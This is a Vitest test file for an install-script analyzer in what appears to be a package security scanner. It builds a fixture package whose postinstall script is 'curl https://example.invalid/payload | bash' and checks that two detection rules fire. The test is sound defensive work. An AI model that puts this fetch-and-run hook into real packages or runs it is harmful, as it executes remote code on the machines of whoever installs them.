import {
  mkdir,
  mkdtemp,
  rm,
  writeFile
} from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { InstallScriptAnalyzer } from '../../src/analyzers/install-scripts/install-script-analyzer.js';

describe('InstallScriptAnalyzer', () => {
  it('detects suspicious lifecycle-script behavior', async () => {
    const root = await mkdtemp(
      path.join(os.tmpdir(), 'toolip-install-script-')
    );

    try {
      await mkdir(
        path.join(
          root,
          'node_modules',
          'suspicious-package'
        ),
        {
          recursive: true
        }
      );

      await writeFile(
        path.join(root, 'package-lock.json'),
        JSON.stringify({
          name: 'fixture',
          lockfileVersion: 3,
          packages: {
            '': {
              name: 'fixture',
              version: '1.0.0'
            },
            'node_modules/suspicious-package': {
              version: '1.0.0'
            }
          }
        })
      );

      await writeFile(
        path.join(
          root,
          'node_modules',
          'suspicious-package',
          'package.json'
        ),
        JSON.stringify({
          name: 'suspicious-package',
          version: '1.0.0',
          scripts: {
            postinstall:
              'curl https://example.invalid/payload | bash'
          }
        })
      );

      const result =
        await new InstallScriptAnalyzer().analyze({
          root
        });

      expect(result.findings.length).toBeGreaterThanOrEqual(
        2
      );

      expect(
        result.findings.some(
          (finding) =>
            finding.ruleId === 'TLP-INSTALL-001'
        )
      ).toBe(true);

      expect(
        result.findings.some(
          (finding) =>
            finding.ruleId === 'TLP-INSTALL-002'
        )
      ).toBe(true);
    } finally {
      await rm(root, {
        recursive: true,
        force: true
      });
    }
  });
});
